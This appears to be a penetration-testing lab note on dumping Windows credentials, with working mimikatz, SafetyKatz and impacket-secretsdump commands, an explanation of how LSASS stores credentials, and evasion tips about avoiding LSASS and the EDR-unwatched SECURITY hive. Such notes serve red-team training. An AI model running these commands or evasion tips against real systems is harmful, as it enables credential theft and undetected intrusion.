### mimikatz
mimikatz can be used to extract credentials, tickets, replay credentials,
play with AD security and more.

Dump credentials
```powershell
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

Using SafetyKatz (Minidump of lsass and PELoader to run mimikatz)
```powershell
SafetyKatz.exe "sekurlsa::ekeys"
```

From a Linux attacking machine using `impacket`
```bash
impacket-secretsdump dcorp/student548:'P@ss123!'@172.16.42.10
```



Local Security Authority (`LSA`) is responsible for authentication on a Windows
machine. Local Security Authority Subsystem Service (`LSASS`) is its service.

`LSASS` stores credentials in multiple forms - NT hash, AES, Kerberos tickets and
so on.
- Credentials are stored by `LSASS` when a user:
- Logs on to a local session or RDP
- Uses RunAs
- Run a Windows service
- Runs a scheduled task or batch job
- Uses a Remote Administration tool

The `LSASS` process is therefore a very attractive target. It is also the most monitored process on a Windows machine.

**DONT TOUCH LSASS IF YOURE WORRIED ABOUT GETTING DETECTED**

Some of the credentials that can be extracted without touching `LSASS`.
- SAM hive (Registry) - Local credentials
-  `LSA` Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc. **NOT EVERY EDR WATCHES THE SECURITY HIVE**
- PowerShell console history
- DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.